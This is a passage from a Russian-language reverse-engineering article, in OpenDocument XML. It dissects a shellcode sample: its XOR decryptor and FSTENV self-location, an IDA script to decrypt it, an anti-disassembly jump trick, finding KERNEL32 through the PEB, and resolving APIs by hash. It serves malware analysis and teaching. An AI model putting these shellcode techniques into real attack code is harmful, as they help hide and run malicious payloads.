      <text:p text:style-name="P22">Первые 8 команд более или менее понятны, а вот дальше начинается явный мусор, типа инструкций <text:span text:style-name="T1">IN</text:span> и <text:span text:style-name="T1">OUT</text:span>, которые при попытке выполнения на прикладном режиме возбуждают <text:soft-page-break/>исключение. Тут что-то не так! Либо точка входа в <text:span text:style-name="T1">shell</text:span>-код начинается не с первого байта (но это противоречит результатам наших исследований), либо <text:span text:style-name="T1">shell</text:span>-код зашифрован. Присмотревшись к первым восьми командам повнимательнее, мы с удовлетворением обнаруживаем тривиальный расшифровщик в лице инструкции <text:span text:style-name="T1">XOR</text:span>, следовательно, точка входа в <text:span text:style-name="T1">shell</text:span>-код определена нами правильно и все, что нужно — это расшифровать его, а для этого мы должны определить значение регистров <text:span text:style-name="T1">EBX</text:span> и <text:span text:style-name="T1">ECX</text:span>, используемых расшифровщиком.</text:p>
      <text:p text:style-name="P22">С регистром <text:span text:style-name="T1">ECX</text:span> разобраться несложно — он инициализируется явно, путем нехитрых математических преобразований: <text:span text:style-name="T1">sub ecx</text:span>,<text:span text:style-name="T1">ecx</text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T7">ecx</text:span><text:span text:style-name="T35">:=0; </text:span><text:span text:style-name="T7">sub ebx</text:span><text:span text:style-name="T35">,-50</text:span><text:span text:style-name="T7">h</text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T7">add ecx</text:span><text:span text:style-name="T35">,50</text:span><text:span text:style-name="T7">h</text:span><text:span text:style-name="T32"></text:span><text:span text:style-name="T7">ecx</text:span><text:span text:style-name="T35"> := 50</text:span><text:span text:style-name="T7">h</text:span><text:span text:style-name="T35">, то есть на входе в расшифровщик </text:span><text:span text:style-name="T7">ECX</text:span><text:span text:style-name="T35"> будет иметь значение 50</text:span><text:span text:style-name="T7">h </text:span><text:span text:style-name="T35">– именно столько двойных слов нам предстоит расшифровать.</text:span></text:p>
      <text:p text:style-name="P27">С регистром <text:span text:style-name="T1">EBX</text:span> все обстоит намного сложнее и чтобы вычислить его значение, необходимо углубиться во внутренние структуры данных сопроцессора. Команда <text:span text:style-name="T1">FLDZ</text:span> помещает на стек сопроцессора константу +0.0, а команда FSTENV сохраняет текущую среду сопроцессора по адресу [esp-0C<text:span text:style-name="T1">h</text:span>]. Открыв<text:span text:style-name="T1"> "</text:span><text:span text:style-name="T2">Intel Architecture Software Developer's Manual Volume 2: Instruction Set Reference</text:span><text:span text:style-name="T1">", </text:span>среди<text:span text:style-name="T1"> </text:span>прочей<text:span text:style-name="T1"> </text:span>полезной<text:span text:style-name="T1"> </text:span>информации<text:span text:style-name="T1"> </text:span>мы<text:span text:style-name="T1"> </text:span>найдем<text:span text:style-name="T1"> </text:span>и<text:span text:style-name="T1"> </text:span>сам<text:span text:style-name="T1"> </text:span>формат<text:span text:style-name="T1"> </text:span>среды<text:span text:style-name="T1"> FPU:</text:span></text:p>
      <text:p text:style-name="P24"/>
      <text:p text:style-name="Standard"><text:span text:style-name="T17">FPUControlWord<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T33"></text:span><text:span text:style-name="T17"> SRC(FPUControlWord);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T17">FPUStatusWord<text:tab/></text:span><text:span text:style-name="T19"><text:tab/></text:span><text:span text:style-name="T17"><text:tab/></text:span><text:span text:style-name="T33"></text:span><text:span text:style-name="T17"> SRC(FPUStatusWord);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T17">FPUTagWord<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T33"></text:span><text:span text:style-name="T17"> SRC(FPUTagWord);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T17">FPUDataPointer<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T33"></text:span><text:span text:style-name="T17"> SRC(FPUDataPointer);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T17">FPUInstructionPointer<text:tab/><text:tab/></text:span><text:span text:style-name="T33"></text:span><text:span text:style-name="T17"> SRC(FPUInstructionPointer);</text:span></text:p>
      <text:p text:style-name="Standard"><text:span text:style-name="T17">FPULastInstructionOpcode<text:tab/></text:span><text:span text:style-name="T33"></text:span><text:span text:style-name="T17"> SRC(FPULastInstructionOpcode);</text:span></text:p>
      <text:p text:style-name="P33">Листинг <text:sequence text:ref-name="refЛистинг9" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">10</text:sequence> псевдокод команды <text:span text:style-name="T1">fstenv</text:span>, сохраняющей среду <text:span text:style-name="T1">FPU</text:span></text:p>
      <text:p text:style-name="P25">Наложив эту структуру на стек, мы получим вот что:</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P7">-&gt;- fstenv -&gt;<text:tab/>- 0Ch<text:tab/>FPUControlWord</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/>- 08h<text:tab/>FPUStatusWord</text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/>- 04h<text:tab/>FPUTagWord</text:p>
      <text:p text:style-name="P7">-&gt;--- esp ---&gt;<text:tab/> <text:s/>00h<text:tab/>FPUDataPointer</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T14">&lt;- pop ebx -&lt;-</text:span><text:span text:style-name="T15"><text:tab/>+ 04h<text:tab/></text:span><text:span text:style-name="T14">FPUInstructionPointer</text:span></text:p>
      <text:p text:style-name="P7"><text:tab/><text:tab/>+ 08<text:tab/>FPULastInstructionOpcode</text:p>
      <text:p text:style-name="P33">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг10" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">11</text:sequence><text:span text:style-name="T1"> </text:span>карта размещения среды в стековой памяти</text:p>
      <text:p text:style-name="P26">Из этой схемы видно, что команда <text:span text:style-name="T1">POP EBX</text:span> выталкивает в регистр <text:span text:style-name="T1">EBX</text:span> адрес последний <text:span text:style-name="T1">FPU</text:span>-инструкции, которой и является <text:span text:style-name="T1">FLDZ</text:span>, расположенной по смещению 5<text:span text:style-name="T1">h</text:span> (условно). При исполнении на "живом" процессоре смещение будет наверняка другим и чтобы не погибнуть, <text:span text:style-name="T1">shell</text:span>-код должен определить где именно он располагается в памяти. Разработчик <text:span text:style-name="T1">shell</text:span>-кода применил довольно необычный подход, в то время как подавляющее большинство ограничивается тупым <text:span text:style-name="T1">CALL</text:span>/<text:span text:style-name="T1">POP REG</text:span>. Сложив полученное смещение 5<text:span text:style-name="T1">h</text:span> с константой 13<text:span text:style-name="T1">h</text:span>, фигурирующей в инструкции <text:span text:style-name="T1">XOR</text:span>, мы получим 18<text:span text:style-name="T1">h </text:span>– адрес первого зашифрованного байта.</text:p>
      <text:p text:style-name="P26">Зная значения регистров, нетрудно расшифровать <text:span text:style-name="T1">shell</text:span>-код. В <text:span text:style-name="T1">IDA Pro</text:span> для этого достаточно написать следующий скрипт:</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P16"><text:span text:style-name="T15">auto</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">a</text:span><text:span text:style-name="T18">,</text:span><text:span text:style-name="T15">x</text:span><text:span text:style-name="T18">;<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>// объявление переменных</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">for(a = 0; a &lt; 0x50; a++)<text:tab/><text:tab/><text:tab/>// </text:span><text:span text:style-name="T18">цикл</text:span><text:span text:style-name="T15"> </text:span><text:span text:style-name="T18">расшифровки</text:span></text:p>
      <text:p text:style-name="P7">{</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15"><text:tab/>x</text:span><text:span text:style-name="T18">=</text:span><text:span text:style-name="T15">Dword</text:span><text:span text:style-name="T18">(</text:span><text:span text:style-name="T15">MK</text:span><text:span text:style-name="T18">_</text:span><text:span text:style-name="T15">FP</text:span><text:span text:style-name="T18">("</text:span><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000",</text:span><text:span text:style-name="T15">a</text:span><text:span text:style-name="T18">*4+0</text:span><text:span text:style-name="T15">x</text:span><text:span text:style-name="T18">18));<text:tab/>// читаем очередной двойное слово</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">x</text:span><text:span text:style-name="T18"> = <text:s/></text:span><text:span text:style-name="T15">x</text:span><text:span text:style-name="T18"> ^ 0</text:span><text:span text:style-name="T15">x</text:span><text:span text:style-name="T18">3704</text:span><text:span text:style-name="T15">F</text:span><text:span text:style-name="T18">519;<text:tab/><text:tab/><text:tab/>// расшифровываем </text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">PatchDword</text:span><text:span text:style-name="T18">(</text:span><text:span text:style-name="T15">MK</text:span><text:span text:style-name="T18">_</text:span><text:span text:style-name="T15">FP</text:span><text:span text:style-name="T18">("</text:span><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000",</text:span><text:span text:style-name="T15">a</text:span><text:span text:style-name="T18">*4+0</text:span><text:span text:style-name="T15">x</text:span><text:span text:style-name="T18">18),</text:span><text:span text:style-name="T15">x</text:span><text:span text:style-name="T18">);//записываем расшифрованное значение</text:span></text:p>
      <text:p text:style-name="P9">}</text:p>
      <text:p text:style-name="P33">Листинг <text:sequence text:ref-name="refЛистинг11" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">12</text:sequence> скрипт для <text:span text:style-name="T1">IDA Pro</text:span>, расшифровывающий <text:span text:style-name="T1">shell</text:span>-код</text:p>
      <text:p text:style-name="P26">Нажимаем &lt;<text:span text:style-name="T1">Shift</text:span>-<text:span text:style-name="T1">F</text:span>2&gt;, в появившимся диалоговом окне вводим вышеприведенный код, запуская его на выполнение по &lt;<text:span text:style-name="T1">Ctrl</text:span>-<text:span text:style-name="T1">Enter</text:span>&gt;. В <text:span text:style-name="T1">hiew</text:span>'е расшифровка осуществляется еще проще. Открываем файл <text:span text:style-name="T1">shellcode</text:span>, однократным нажатием <text:span text:style-name="T1">ENTER</text:span>'а переводим редактор в <text:span text:style-name="T1">hex</text:span>-режим, подводим курсор к смещению 18h — туда, где кончается расшифровщик и начинается зашифрованный код (<text:span text:style-name="T12">см. листинг 9</text:span>), переходим в режим редактирования по &lt;<text:span text:style-name="T1">F</text:span>3&gt;, давим &lt;<text:span text:style-name="T1">F</text:span>8&gt; (<text:span text:style-name="T1">Xor</text:span>) и вводим константу шифрования, записанную с учетом порядка байтов на <text:span text:style-name="T1">x</text:span>86 задом наперед: 19<text:span text:style-name="T1">h</text:span> F5<text:span text:style-name="T1">h</text:span> 04<text:span text:style-name="T1">h</text:span> 37<text:span text:style-name="T1">h</text:span> и жмем &lt;<text:span text:style-name="T1">F</text:span>8&gt; до тех пор пока курсор не дойдет до конца файла. Сохраняем изменения клавшей &lt;<text:span text:style-name="T1">F</text:span>9&gt; и выходим.</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P33"><text:soft-page-break/>Рисунок <text:sequence text:ref-name="refDrawing2" text:name="Drawing" text:formula="ooow:Drawing+1" style:num-format="1">3</text:sequence> расшифровка <text:span text:style-name="T1">shell</text:span>-кода в <text:span text:style-name="T1">hiew</text:span>'<text:span text:style-name="T1">e</text:span></text:p>
      <text:p text:style-name="P26">После расшифровки <text:span text:style-name="T1">shell</text:span>-код можно дизассемблировать в обычном режиме. Начинаем анализ и… тут же вляпываемся в древний, но все еще работающий антидизассемблерный трюк:</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P7">seg000:019 loc_19:<text:tab/><text:tab/><text:tab/><text:tab/><text:tab/>; CODE XREF: seg000:0000001C↓p</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:019 6</text:span><text:span text:style-name="T15">A</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T14">EB</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">push</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">FFFFFF</text:span><text:span text:style-name="T14">EBh</text:span><text:span text:style-name="T13"><text:tab/></text:span><text:span text:style-name="T18">; скрытая команда в операнде</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:01</text:span><text:span text:style-name="T15">B</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T13">4</text:span><text:span text:style-name="T14">D</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T15">dec</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">ebp</text:span><text:span text:style-name="T18"><text:tab/><text:tab/>; продолжение скрытой команды</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:01</text:span><text:span text:style-name="T15">C</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">E</text:span><text:span text:style-name="T18">8 </text:span><text:span text:style-name="T15">F</text:span><text:span text:style-name="T18">9 </text:span><text:span text:style-name="T15">FF</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">FF</text:span><text:span text:style-name="T18"> </text:span><text:span text:style-name="T15">FF</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">call</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">loc</text:span><text:span text:style-name="T18">_19+1<text:tab/>; вызов в середину </text:span><text:span text:style-name="T15">push</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:021 60<text:tab/><text:tab/><text:tab/></text:span><text:span text:style-name="T15">pusha</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/>; сохраняем все регистры</text:span></text:p>
      <text:p text:style-name="P33">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг12" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">13</text:sequence><text:span text:style-name="T1"> </text:span>древний антидизассемблерный трюк — прыжок в середину команды</text:p>
      <text:p text:style-name="P26">Команда "<text:span text:style-name="T23">CALL LOC</text:span><text:span text:style-name="T20">_19+1</text:span>" прыгает куда-то в середину инструкции <text:span text:style-name="T20">PUSH</text:span>, засылающей в стек константу FFFFFFEBh в которой опытные кодокопатели уже наверняка увидели инструкцию безусловного перехода, заданную опкодом <text:span text:style-name="T1">EBh</text:span>, а вся команда выглядит так: <text:span text:style-name="T1">EBh </text:span>4<text:span text:style-name="T1">Dh</text:span>, где 4<text:span text:style-name="T1">Dh</text:span> "отрываются" от инструкции <text:span text:style-name="T1">DEC</text:span> <text:span text:style-name="T1">EBP</text:span>. Важно не забывать, что <text:span text:style-name="T23">PUSH</text:span> с опкодом 6<text:span text:style-name="T1">Ah</text:span> — это знаковая команда, то есть никаких <text:span text:style-name="T1">FFh</text:span> в самом опкоде нет, поэтому вместо перехода по адресу <text:span text:style-name="T1">EBh FFh</text:span> (как это следует из дизассемблерного текста) мы получаем переход по адресу <text:span text:style-name="T1">EBh </text:span>4<text:span text:style-name="T1">Dh</text:span> (как это следует из машинного кода), что совсем не одно и тоже! Сам переход, кстати говоря, относительный и вычисляется от конца команды <text:span text:style-name="T23">JMP</text:span>, длина которой в данном случае равна двум. Складываем 4<text:span text:style-name="T1">Dh</text:span> (целевой адрес перехода) с 1A<text:span text:style-name="T1">h</text:span> (адрес самой команды перехода — <text:span text:style-name="T1">loc</text:span>_19 + 1 = 1<text:span text:style-name="T1">Ah</text:span>) и получаем 69<text:span text:style-name="T1">h</text:span>. Именно по этому смещению и будет передано управление! А команды, идущие за инструкцией <text:span text:style-name="T23">CALL</text:span><text:span text:style-name="T20">,</text:span> расположены чисто для маскировки, чтобы противник подольше голову поломал.</text:p>
      <text:p text:style-name="P26">Хорошо, отправляется в район 69<text:span text:style-name="T1">h</text:span> и смотрим что хорошего у нас там:</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P8">seg000:00000069 31 DB<text:tab/><text:tab/>xor<text:tab/>ebx, ebx<text:tab/>; ebx := 0</text:p>
      <text:p text:style-name="P8">seg000:0000006B 64 8B 43 30<text:tab/>mov<text:tab/>eax, fs:[ebx+30h] ; PEB</text:p>
      <text:p text:style-name="P8">seg000:0000006F 8B 40 0C<text:tab/>mov<text:tab/>eax, [eax+0Ch]<text:tab/>; PEB_LDR_DATA</text:p>
      <text:p text:style-name="P8">seg000:00000072 8B 70 1C<text:tab/>mov<text:tab/>esi, [eax+1Ch]<text:tab/>; InInitializationOrderModuleList</text:p>
      <text:p text:style-name="P8">seg000:00000075 AD<text:tab/><text:tab/>lodsd<text:tab/><text:tab/><text:tab/>; EAX := *ESI</text:p>
      <text:p text:style-name="P8">seg000:00000076 8B 40 08<text:tab/>mov<text:tab/>eax, [eax+8]<text:tab/>; BASE of KERNEL32.DLL</text:p>
      <text:p text:style-name="P33">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг13" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">14</text:sequence><text:span text:style-name="T1"> </text:span>код, вычисляющий базовый адрес <text:span text:style-name="T1">KERNEL</text:span>32.<text:span text:style-name="T1">DLL</text:span> через <text:span text:style-name="T1">PEB</text:span></text:p>
      <text:p text:style-name="P26">С первой командой, обнуляющей <text:span text:style-name="T1">EBX</text:span> через <text:span text:style-name="T1">XOR</text:span>, все понятно. Но вот вторая… что-то считывает из ячейки, лежащей по адресу <text:span text:style-name="T22">FS</text:span><text:span text:style-name="T21">:[</text:span><text:span text:style-name="T22">EBX</text:span><text:span text:style-name="T21">+30]</text:span>. Селектор <text:span text:style-name="T1">FS</text:span> указывает на область памяти, где операционная система хранит служебные (и практически никак недокументированные) данные потока. К счастью в нашем распоряжении есть Интернет. Набираем в Гугле "<text:span text:style-name="T1">fs</text:span>:[30<text:span text:style-name="T1">h</text:span>]" (с кавычками!) и получаем кучу ссылок от рекламы картриджей <text:span text:style-name="T1">TK</text:span>-30<text:span text:style-name="T1">H</text:span> до вполне вменяемых материалов, из которых мы узнаем, что в ячейке <text:span text:style-name="T1">FS</text:span>:[30<text:span text:style-name="T1">h</text:span>] хранится указатель на Process Enviroment Block<text:span text:style-name="T1"> </text:span>– Блок Окружения Процесса или, сокращенно, <text:span text:style-name="T1">PEB</text:span>.</text:p>
      <text:p text:style-name="P26">Описание самого <text:span text:style-name="T1">PEB</text:span>'а (как и многих других внутренних структур операционной системы) можно почерпнуть из замечательной книги "<text:span text:style-name="T10">The Undocumented Functions </text:span><text:span text:style-name="T2">Microsoft</text:span><text:span text:style-name="T10"> </text:span><text:span text:style-name="T2">Windows</text:span><text:span text:style-name="T10"> </text:span><text:span text:style-name="T2">NT</text:span><text:span text:style-name="T10">/2000</text:span>", электронная версия которой доступа по адресу http://undocumented.ntinternals.net/.</text:p>
      <text:p text:style-name="P26">Из нее мы узнаем, что по смещению 0<text:span text:style-name="T1">Ch</text:span> от начала <text:span text:style-name="T1">PEB</text:span> лежит указатель на структуру PEB_LDR_DATA, по смещению 1<text:span text:style-name="T1">Ch</text:span> от начала которой лежит список. _не_ указатель на список, а сам список, состоящий из двух двойных слов: указателя на следующий <text:span text:style-name="T1">LIST</text:span>_<text:span text:style-name="T1">ENTRY</text:span> и указателя на экземпляр структуры LDR_MODULE, перечисленные в порядке инициализации модулей, а первым, как известно, инициализируется <text:span text:style-name="T1">KERNEL</text:span>32.<text:span text:style-name="T1">DLL</text:span>.</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P18"><text:span text:style-name="T15">/* 00 */ ULONG<text:tab/><text:tab/><text:tab/>Length;</text:span></text:p>
      <text:p text:style-name="P8">/* 04 */ BOOLEAN<text:tab/><text:tab/>Initialized;</text:p>
      <text:p text:style-name="P8">/* 08 */ PVOID<text:tab/><text:tab/><text:tab/>SsHandle;</text:p>
      <text:p text:style-name="P8">/* 0C */ LIST_ENTRY<text:tab/><text:tab/>InLoadOrderModuleList;</text:p>
      <text:p text:style-name="P8">/* 14 */ LIST_ENTRY<text:tab/><text:tab/>InMemoryOrderModuleList;</text:p>
      <text:p text:style-name="P8">/* 1C */ LIST_ENTRY<text:tab/><text:tab/>InInitializationOrderModuleList;</text:p>
      <text:p text:style-name="P33">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг14" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">15</text:sequence><text:span text:style-name="T1"> </text:span>недокументированная структура <text:span text:style-name="T1">PEB</text:span>_<text:span text:style-name="T1">LDR</text:span>_<text:span text:style-name="T1">DATA</text:span></text:p>
      <text:p text:style-name="P26">Описание самой структуры LDR_MODULE выглядит так (кстати говоря, в "The Undocumented Functions <text:span text:style-name="T1">Microsoft</text:span> <text:span text:style-name="T1">Windows</text:span> <text:span text:style-name="T1">NT</text:span>/2000" допущена грубая ошибка — пропущен <text:span text:style-name="T1">union</text:span>):</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P7">typedef struct _LDR_MODULE {</text:p>
      <text:p text:style-name="P7"><text:soft-page-break/>union order_type</text:p>
      <text:p text:style-name="P7">{</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">/* 00 */ LIST_ENTRY<text:tab/><text:tab/>InLoadOrderModuleList;</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">/* 00 */ LIST_ENTRY</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15"><text:tab/>InMemoryOrderModuleList;</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">/* 00 */ LIST_ENTRY</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15"><text:tab/>InInitializationOrderModuleList;</text:span></text:p>
      <text:p text:style-name="P7">}</text:p>
      <text:p text:style-name="P7">/* 08 */ PVOID<text:tab/><text:tab/><text:tab/>BaseAddress;</text:p>
      <text:p text:style-name="P7">/* 0C */ PVOID<text:tab/><text:tab/><text:tab/>EntryPoint;</text:p>
      <text:p text:style-name="P7">/* 10 */ ULONG<text:tab/><text:tab/><text:tab/>SizeOfImage;</text:p>
      <text:p text:style-name="P7">/* 14 */ UNICODE_STRING<text:tab/>FullDllName;</text:p>
      <text:p text:style-name="P7">/* 18 */ UNICODE_STRING<text:tab/>BaseDllName;</text:p>
      <text:p text:style-name="P7">/* 1C */ ULONG<text:tab/><text:tab/><text:tab/>Flags;</text:p>
      <text:p text:style-name="P7">/* 20 */ SHORT<text:tab/><text:tab/><text:tab/>LoadCount;</text:p>
      <text:p text:style-name="P7">/* 22 */ SHORT<text:tab/><text:tab/><text:tab/>TlsIndex;</text:p>
      <text:p text:style-name="P7">/* 24 */ LIST_ENTRY<text:tab/><text:tab/>HashTableEntry;</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">/* 28 */ ULONG<text:tab/><text:tab/></text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">TimeDateStamp;</text:span></text:p>
      <text:p text:style-name="P7"/>
      <text:p text:style-name="P7">} LDR_MODULE, *PLDR_MODULE;</text:p>
      <text:p text:style-name="P33">Листинг <text:sequence text:ref-name="refЛистинг15" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">16</text:sequence> недокументированная структура <text:span text:style-name="T1">LDR</text:span>_<text:span text:style-name="T1">MODULE</text:span></text:p>
      <text:p text:style-name="P25">Самая трудная часть позади. Теперь мы точно знаем, что <text:span text:style-name="T1">EAX</text:span> содержит базовый адрес <text:span text:style-name="T1">KERNEL</text:span>32.<text:span text:style-name="T1">DLL</text:span>. Продолжаем анализировать дальше.</text:p>
      <text:p text:style-name="P25"/>
      <text:p text:style-name="P18"><text:span text:style-name="T15">seg000:00000079 5E<text:tab/><text:tab/><text:tab/>pop<text:tab/>esi<text:tab/><text:tab/>; esi := &amp;MyGetProcAddress</text:span></text:p>
      <text:p text:style-name="P8">seg000:0000007A 68 8E 4E 0E EC<text:tab/>push<text:tab/>0EC0E4E8Eh<text:tab/>; #LoadLibraryA</text:p>
      <text:p text:style-name="P8">seg000:0000007F 50<text:tab/><text:tab/><text:tab/>push<text:tab/>eax<text:tab/><text:tab/>; base of KERNEL32.DLL</text:p>
      <text:p text:style-name="P8">seg000:00000080 FF D6<text:tab/><text:tab/><text:tab/>call<text:tab/>esi<text:tab/><text:tab/>; MyGetProcAddress</text:p>
      <text:p text:style-name="P33">Листинг<text:span text:style-name="T1"> </text:span><text:sequence text:ref-name="refЛистинг16" text:name="Листинг" text:formula="ooow:Листинг+1" style:num-format="1">17</text:sequence><text:span text:style-name="T1"> </text:span>вызов <text:span text:style-name="T1">API</text:span>-функции по хэш-именам</text:p>
      <text:p text:style-name="P26">Команда <text:span text:style-name="T1">POP ESI</text:span> выталкивает в регистр <text:span text:style-name="T1">ESI</text:span> двойное слово, лежащее на вершине стека. А что у нас там? Помните команду <text:span text:style-name="T23">CALL</text:span>, передающую управление хитрой инструкции <text:span text:style-name="T23">JMP</text:span>? Она положила на стек адрес возврата, то есть адрес следующей за ней команды, равный в данном случае 021<text:span text:style-name="T1">h</text:span>, который тут же и вызывается инструкцией <text:span text:style-name="T23">CALL ESI</text:span>, принимающий два аргумента — базовый адрес <text:span text:style-name="T1">KERNEL</text:span>32.<text:span text:style-name="T1">DLL</text:span>, передаваемый в регистре <text:span text:style-name="T1">EAX</text:span> и непонятную константу 0EC0E4E8Eh.</text:p>
      <text:p text:style-name="P26"/>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000021 60<text:tab/><text:tab/></text:span><text:span text:style-name="T15">pusha</text:span><text:span text:style-name="T18"><text:tab/><text:tab/><text:tab/><text:tab/>; сохраняем все регистры</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:00000022 8B 6C 24 24<text:tab/>mov<text:tab/>ebp, [esp+24h]<text:tab/>; base of KERNEL32.DLL</text:span></text:p>
      <text:p text:style-name="P7">seg000:00000026 8B 45 3C<text:tab/>mov<text:tab/>eax, [ebp+3Ch]<text:tab/>; PE header</text:p>
      <text:p text:style-name="P7">seg000:00000029 8B 7C 05 78<text:tab/>mov<text:tab/>edi, [ebp+eax+78h]<text:tab/>; export table RVA</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:0000002D 01 EF<text:tab/><text:tab/>add<text:tab/>edi, ebp<text:tab/><text:tab/>; </text:span><text:span text:style-name="T18">адрес</text:span><text:span text:style-name="T15"> </text:span><text:span text:style-name="T18">таблицы</text:span><text:span text:style-name="T15"> </text:span><text:span text:style-name="T18">экспорта</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:0000002F 8B 4F 18<text:tab/>mov<text:tab/>ecx, [edi+18h]<text:tab/><text:tab/>; numberOfNamePointers</text:span></text:p>
      <text:p text:style-name="P7">seg000:00000032 8B 5F 20<text:tab/>mov<text:tab/>ebx, [edi+20h]<text:tab/><text:tab/>; namePointerRVA</text:p>
      <text:p text:style-name="P7">seg000:00000035 01 EB<text:tab/><text:tab/>add<text:tab/>ebx, ebp<text:tab/><text:tab/>; namePointer VA</text:p>
      <text:p text:style-name="P7">seg000:00000037</text:p>
      <text:p text:style-name="P7">seg000:00000037 loc_37:<text:tab/><text:tab/><text:tab/><text:tab/>; CODE XREF: seg000:00000050↓j</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000037 49<text:tab/><text:tab/></text:span><text:span text:style-name="T15">dec</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">ecx</text:span><text:span text:style-name="T18"><text:tab/><text:tab/>; обрабатываем след. имя</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:00000038 8</text:span><text:span text:style-name="T15">B</text:span><text:span text:style-name="T18"> 34 8</text:span><text:span text:style-name="T15">B</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">mov</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">esi</text:span><text:span text:style-name="T18">, [</text:span><text:span text:style-name="T15">ebx</text:span><text:span text:style-name="T18">+</text:span><text:span text:style-name="T15">ecx</text:span><text:span text:style-name="T18">*4]; </text:span><text:span text:style-name="T15">RVA</text:span><text:span text:style-name="T18">-адрес функции</text:span></text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg</text:span><text:span text:style-name="T18">000:0000003</text:span><text:span text:style-name="T15">B</text:span><text:span text:style-name="T18"> 01 </text:span><text:span text:style-name="T15">EE</text:span><text:span text:style-name="T18"><text:tab/><text:tab/></text:span><text:span text:style-name="T15">add</text:span><text:span text:style-name="T18"><text:tab/></text:span><text:span text:style-name="T15">esi</text:span><text:span text:style-name="T18">, </text:span><text:span text:style-name="T15">ebp</text:span><text:span text:style-name="T18"><text:tab/>; вирт. адрес функции</text:span></text:p>
      <text:p text:style-name="P7">seg000:0000003D 31 C0<text:tab/><text:tab/>xor<text:tab/>eax, eax<text:tab/>; EAX := 0</text:p>
      <text:p text:style-name="P7">seg000:0000003F 99<text:tab/><text:tab/>cdq<text:tab/><text:tab/><text:tab/>; EDX := 0</text:p>
      <text:p text:style-name="P16"><text:span text:style-name="T15">seg000:00000040</text:span></text:p>
      <text:p text:style-name="P7">seg000:00000040 loc_40:<text:tab/><text:tab/><text:tab/><text:tab/>; CODE XREF: seg000:0000004A↓j</text:p>
